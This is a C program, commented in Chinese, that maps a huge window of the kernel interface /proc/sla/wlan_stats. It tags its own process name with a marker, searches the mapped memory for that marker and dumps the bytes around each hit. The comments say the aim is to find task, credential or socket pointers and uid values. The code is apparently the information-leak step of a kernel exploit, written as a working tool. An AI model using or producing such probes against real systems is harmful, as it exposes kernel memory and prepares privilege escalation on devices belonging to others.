/* slapoke.c — 把 /proc/sla 窗口里"我们自己的 comm 标记"周围的东西印出来。
 * 目的: 看这些记录是什么结构、里面有没有**任务/凭据/socket 的指针或 uid**那样的动态值。
 * 只读。用法: slapoke [标记] */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }

static void dump(struct sigaction *old, const unsigned char *m, size_t o, size_t n, const char *tag) {
  printf("---- %s @ +%zu ----\n", tag, o);
  for (size_t i = 0; i < n; i += 8) {
    on = 1;
    uint64_t v = 0;
    if (sigsetjmp(jb, 1) == 0) v = q(m, o + i);
    on = 0;
    char txt[9];
    for (int c = 0; c < 8; c++) {
      unsigned char b = (unsigned char)(v >> (8 * c));
      txt[c] = (b >= 0x20 && b <= 0x7e) ? b : '.';
    }
    txt[8] = 0;
    printf("  +%6zu  %016llx  %s\n", i, (unsigned long long)v, txt);
  }
}

int main(int argc, char **argv) {
  const char *nm = argc > 1 ? argv[1] : "SLA9x7Qm2Wt4Zk";
  char name[16];
  snprintf(name, sizeof name, "%.15s", nm);
  prctl(PR_SET_NAME, name, 0, 0, 0);
  int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open errno=%d\n", errno); return 1; }
  size_t L = 1ull << 30;
  unsigned char *m = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { printf("mmap errno=%d\n", errno); return 2; }
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t ml = strlen(name);
  int nh = 0;
  for (size_t o = 0; o + ml + 1 <= L && nh < 4; o++) {
    size_t pg = o / 4096u;
    on = 1;
    int rd = 0;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[pg * 4096u]; (void)c; rd = 1; }
    on = 0;
    if (!rd) { o = (pg + 1) * 4096u - 1; continue; }
    if (m[o] != name[0] || memcmp(m + o, name, ml)) continue;
    nh++;
    printf("######## 标记命中 #%d @ +%zu (对齐 %zu) ########\n", nh, o, o % 64);
    dump(&old, m, o - (o % 64) - 192, 512 + 192, "上下文");
  }
  if (!nh) printf("× 没找到标记\n");
  munmap(m, L);
  close(fd);
  return 0;
}
